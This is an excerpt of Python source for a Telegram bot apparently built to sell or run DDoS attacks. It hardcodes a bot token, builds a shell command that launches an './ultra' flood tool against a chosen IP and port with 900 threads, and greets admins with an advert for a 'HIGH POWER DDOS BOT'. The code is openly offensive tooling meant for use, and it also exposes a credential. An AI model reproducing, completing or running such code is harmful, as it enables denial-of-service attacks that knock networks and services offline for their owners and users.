...
BOT_TOKEN = "7487481982:7755296735:AAFdmwmkbuZj8_jb2_FZAwIBe82sXiI-Gvo"
thread_count = 900
packet_size = 9
...
async def run_attack_command_on_codespace(target_ip, target_port, duration, chat_id, user_id):
    try:
        ...
        command = f"./ultra {target_ip} {target_port} {duration} {packet_size} {thread_count} 20"
...
def send_welcome(message):
    ...
    if is_super_admin(user_id):
        ...
        welcome_message = (
            f"Welcome 🫶 {username} , ᚜\n\n"
            f"TO TRUST VIP MOD DDOS THIS IS HIGH POWER DDOS BOT🦠.\n"
